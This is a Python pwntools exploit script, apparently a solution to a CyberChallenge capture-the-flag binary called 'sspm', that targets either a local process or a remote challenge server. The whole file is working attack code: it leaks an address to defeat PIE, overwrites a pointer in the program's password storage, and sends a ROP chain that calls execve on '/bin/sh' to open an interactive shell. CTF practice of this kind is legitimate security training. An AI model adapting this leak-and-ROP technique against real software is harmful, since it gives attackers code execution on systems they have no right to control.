#!/usr/bin/env python3
from pwn import *

bin_name = "./sspm"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("sspm.challs.cyberchallenge.it", 38210)
    else:
        return process(elf.path)

def main():
    r = conn()

    r.sendafter(b'): ',b'/bin/sh\x00'+ b'a'*24)
    r.sendlineafter(b'Choice: ',b'1')
    r.sendlineafter(b'id: ',b'a')
    r.sendlineafter(b'chars): ',b'a')
    r.sendlineafter(b'chars): ',b'a')
    r.sendlineafter(b'chars): ',b'a')
    r.sendlineafter(b'Choice: ',b'3')
    r.sendlineafter(b'1-50): ',b'1')
    r.recvuntil(b'max view count: ')
    leak = r.recvline().strip().decode()
    leak = int(leak)    #write+23
    elf.address = (leak-23) - elf.sym['write']
    pop_rax = elf.address + 0x61e87
    pop_rdi = elf.address + 0xaaff
    pop_rsi = elf.address + 0x12b6e
    pop_rdx_rbx = elf.address + 0xad3ab
    syscall = elf.address + 0xa8b4

    rop1 = flat(
        pop_rax,
        0x3b,
        pop_rdi,
        elf.sym['master_key'],
        pop_rsi,
        0x0,
        pop_rdx_rbx,
        0x0,
    )

    rop2 = flat(
        0x0,
        syscall
    )

    r.sendafter(b'Choice: ',b'1\n')
    r.sendafter(b'id: ',b'100\n')
    r.sendafter(b'view count: ',b'100\n')
    r.sendlineafter(b'chars): ',b'a')
    r.sendafter(b'chars): ',(b'a'*40 + p64(elf.sym['passwords'] + 0xA8 + 0x30))[:47])
    r.sendafter(b'chars): ',rop1[:63])
    r.sendafter(b'chars): ',rop2[:15])
    
    for i in range(17):
        r.sendlineafter(b'Choice: ',b'2')

    r.interactive()

if __name__ == "__main__":
    main()
